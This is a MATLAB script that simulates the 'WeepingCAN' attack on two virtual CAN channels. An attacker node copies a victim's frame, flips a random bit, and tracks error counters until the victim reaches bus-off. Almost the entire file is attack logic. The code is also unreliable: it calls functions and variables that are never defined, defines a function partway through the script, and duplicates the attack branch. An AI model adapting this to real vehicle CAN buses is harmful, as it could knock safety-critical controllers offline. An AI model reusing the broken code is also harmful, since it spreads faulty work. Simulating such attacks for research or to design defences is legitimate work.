% Create and configure virtual CAN channels
attacker = canChannel('MathWorks', 'Virtual 1', 1); % Attacker
victim = canChannel('MathWorks', 'Virtual 1', 2);   % Victim

% Start the channels
start(attacker);
start(victim);

% Simulation parameters
idVictim = 100; % Victim's CAN ID
attackPeriod = 0.1; % Period for attack cycles (100 ms)
maxTEC = 255; % Bus-off threshold
errorPassiveThreshold = 127; % Error passive threshold
tecA = 0; % TEC for attacker
tecV = 0; % TEC for victim
errorIncrement = 8; % Increment for TEC on errors
recoveryDecrement = 1; % Decrement for TEC on successful transmissions
skipCount = 3; % Skip attack every 3rd cycle
counter = 0; % To track total cycles
attackRatio = 2; % The attacker can send 4 messages in a period

% Victim's periodic message
victimMsg = canMessage(idVictim, false, 8);
victimMsg.Data = uint8([0 1 2 3 4 5 6 7]); % Example payload

disp('WeepingCAN attack started...');

% Function to get indices of zero bits
zerosBitIndexes = getZerosIndeces(victimMsg, byteIndex);
   

% Function to convert a byte to an 8-bit binary string
function binaryByte = byteToBinary(byte)
    binaryByte = dec2bin(byte, 8);  % Convert byte to binary and ensure it's 8 bits
end

% Main simulation loop
while tecV < maxTEC && tecA < maxTEC
    disp(['[Cycle ' num2str(counter) '] Attack, running attack...']);
    % Get current timestamp
    %victimTimestamp = datestr(now, 'HH:MM:SS.FFF');

    % Victim sends a periodic message
    transmit(victim, victimMsg);
    %disp(['[Victim] Time: ' victimTimestamp ]);

    %pause(attackPeriod / 2); % Short delay


    % Apply skip logic
    %attack bus off like
    if (skipCount==0)
          
        % Create attack message identical to victim's
        attackMsg = canMessage(idVictim, false, 8);
        attackMsg.Data = victimMsg.Data; % Copy payload

        % Introduce a bit error at a random position
        byteIndex = ceil(randi([1, 64]) / 8); % Random byte index
        zerosIndeces = getZerosIndeces(attackMsg, byteIndex); % Find zero bits
        
        if isempty(zerosIndeces)
            continue;
        
     
        else % Ensure there are zero bits available
            randomZeroBit = randi(length(zerosIndeces));
            randomZeroBitPosition = zerosIndeces(randomZeroBit);
        
            % Set the selected bit to 1
            attackMsg.Data(byteIndex) = bitset(attackMsg.Data(byteIndex), ...
                                           9 - randomZeroBitPosition, 1);
        end

        % Get current timestamp for attacker
        %attackerTimestamp = datestr(now, 'HH:MM:SS.FFF');

        % Transmit attack message
        transmit(attacker, attackMsg);

        % Display the modified target byte in binary
        modifiedByte = attackMsg.Data(byteIndex);  % Get the target byte
        modifiedByteBin = byteToBinary(modifiedByte);  % Convert to binary

        % Display the modified byte in binary format
        disp([ ...
            % '[Attacker] Time: ' attackerTimestamp ...
            ', Modified Byte (Binary): ' modifiedByteBin ...
            ', Error in Byte ' num2str(byteIndex) ...
            ', Bit ' num2str(randomZeroBitPosition)]);

        % Simulate TEC increment due to error
        tecA = tecA + errorIncrement; % Attacker increments +8
        % if the attacker is in error passive, error messages are recessive
        % and the victim doesn't increment its TEC
        if(tecA<errorPassiveThreshold)
            tecV = tecV + errorIncrement; % Victim increments +8
        end   
        % Simulate recovery after successful victim retransmission
        for i=1:attackRatio
            transmit(attacker, generateRandomMessage());
            tecA = tecA-1; % Attacker recovers normally
        end
        transmit(victim, victimMsg);
        tecV = tecV-1; % Victim recovers slower
        % Display current TEC values
        disp(['TEC - Attacker: ' num2str(tecA) ', Victim: ' num2str(tecV)]);
        % Increment cycle counter
        counter = counter + 1;  
        
    end    
    %skip
    if (skipCount>0 && mod(counter, skipCount+1) > 0)
        
        % Victim recovers slightly during skipped cycle
        transmit(victim, victimMsg);
        tecV = tecV-1;
        % Simulate recovery after successful victim retransmission
        for i=1:attackRatio
            transmit(attacker, generateRandomMessage());
            tecA = tecA-1; % Attacker recovers normally
        end
        disp(['Skip, TEC - Attacker: ' num2str(tecA) , ...
            'Victim recovery: TEC ='  num2str(tecV)]);
        % Increment cycle counter
        counter = counter + 1;  
        continue;
    %attack    
    elseif (skipCount>0 && mod(counter, skipCount+1)==0)
        
        disp('Attack, running attack...');
        % Create attack message identical to victim's
        attackMsg = canMessage(idVictim, false, 8);
        attackMsg.Data = victimMsg.Data; % Copy payload

        % Introduce a bit error at a random position
        byteIndex = ceil(randi([1, 64]) / 8); % Random byte index
        zerosIndeces = getZerosIndeces(attackMsg, byteIndex); % Find zero bits
        
        if isempty(zerosIndeces)
            continue;
        
     
        else % Ensure there are zero bits available
            randomZeroBit = randi(length(zerosIndeces));
            randomZeroBitPosition = zerosIndeces(randomZeroBit);
        
            % Set the selected bit to 1
            attackMsg.Data(byteIndex) = bitset(attackMsg.Data(byteIndex), ...
                                           9 - randomZeroBitPosition, 1);
        end

        % Get current timestamp for attacker
        attackerTimestamp = datestr(now, 'HH:MM:SS.FFF');

        % Transmit attack message
        transmit(attacker, attackMsg);

        % Display the modified target byte in binary
        modifiedByte = attackMsg.Data(byteIndex);  % Get the target byte
        modifiedByteBin = byteToBinary(modifiedByte);  % Convert to binary

        % Display the modified byte in binary format
        disp([ ...
            % '[Attacker] Time: ' attackerTimestamp ...
            ', Modified Byte (Binary): ' modifiedByteBin ...
            ', Error in Byte ' num2str(byteIndex) ...
            ', Bit ' num2str(randomZeroBitPosition)]);

        % Simulate TEC increment due to error
        tecA = tecA + errorIncrement; % Attacker increments +8
        % if the attacker is in error passive, error messages are recessive
        % and the victim doesn't increment its TEC
        if(tecA<errorPassiveThreshold)
            tecV = tecV + errorIncrement; % Victim increments +8
        end   
        % Simulate recovery after successful victim retransmission
        for i=1:attackRatio
            transmit(attacker, generateRandomMessage());
            tecA = tecA-1; % Attacker recovers normally
        end
        transmit(victim, victimMsg);
        tecV = tecV-1; % Victim recovers slower
        % Display current TEC values
        disp(['TEC - Attacker: ' num2str(tecA) ', Victim: ' num2str(tecV)]);
        % Increment cycle counter
        counter = counter + 1;  
    end
   
  
    % Pause for synchronization
    %pause(attackPeriod / 2);
end

% Cleanup after attack
stop(attacker);
stop(victim);
clear attacker victim;

% Display result
if tecV >= maxTEC
    disp('Victim entered bus-off state. Attack successful!');
else 
    disp('Attacker entered bus-off state. Attack failed.');
end
